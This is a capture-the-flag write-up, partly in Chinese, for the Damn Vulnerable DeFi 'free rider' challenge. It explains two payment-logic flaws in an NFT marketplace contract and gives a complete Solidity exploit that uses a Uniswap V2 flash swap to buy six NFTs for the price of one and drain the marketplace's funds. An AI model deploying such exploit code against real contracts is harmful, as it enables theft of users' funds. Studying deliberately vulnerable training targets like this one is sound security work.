# Damn Vulnerable DeFi v4 - free rider

- https://www.damnvulnerabledefi.xyz/challenges/free-rider/

## check condition

清除 marketplace 上面的所有 order 並轉移到 recoveryManagerOwner

```solidity
for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
    vm.prank(recoveryManagerOwner);
    nft.transferFrom(
        address(recoveryManager),
        recoveryManagerOwner,
        tokenId
    );
    assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
}
```

## break

檢查支付的金額是有問題的。在購買多個 nft 的情境下，可以以單個 nft 的價格購買多個 nft:

```solidity
// buy 6 nft with msg.value = 15 eth will not revert
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        unchecked {
            _buyOne(tokenIds[i]);
        }
    }
}

function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {
        revert InsufficientPayment();
    }
}
```

marketplace 支付是也有問題的，應要向「前擁有者」支付購買的錢，但是這裡則是向「買家」付款。所以只要有錢，就可以無損購買 NFT，在購買多個的清況下，可以抽走 marketplace 的資金:

```solidity
// transfer ownership to buyer
_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

// now ownership is the buyer, not the previous owner
payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```

## solution

player 沒有足夠的初始資金可以從 uniswap-v2 以 flashloan 借出來購買 nft 即可：

```solidity
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Trigger is IERC721Receiver, IUniswapV2Callee {
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    WETH weth;
    FreeRiderRecoveryManager recoveryManager;
    DamnValuableNFT nft;

    constructor(
        IUniswapV2Pair pair_,
        FreeRiderNFTMarketplace marketplace_,
        WETH weth_,
        FreeRiderRecoveryManager recoveryManager_,
        DamnValuableNFT nft_
    ) {
        pair = pair_;
        marketplace = marketplace_;
        weth = weth_;
        recoveryManager = recoveryManager_;
        nft = nft_;
    }

    function trigger() external {
        bytes memory _data = abi.encode(address(this));
        pair.swap(15 ether, 0, address(this), _data);
    }

    function withdraw() external {
        payable(msg.sender).call{value: address(this).balance}(new bytes(0));
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata _data
    ) external {
        // vars
        uint256 payment = 15 ether;
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            ids[i] = i;
        }

        // get native eth
        weth.withdraw(payment);

        // buy nft
        marketplace.buyMany{value: payment}(ids);

        // send nft to recoveryManager
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                _data
            );
        }

        // repay flashloan
        uint256 repayAmount = payment + 1 ether; // uniswap-v2's fee is about 0.3%, but I'm lazy.
        weth.deposit{value: repayAmount}();
        weth.transfer(address(pair), repayAmount);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
```
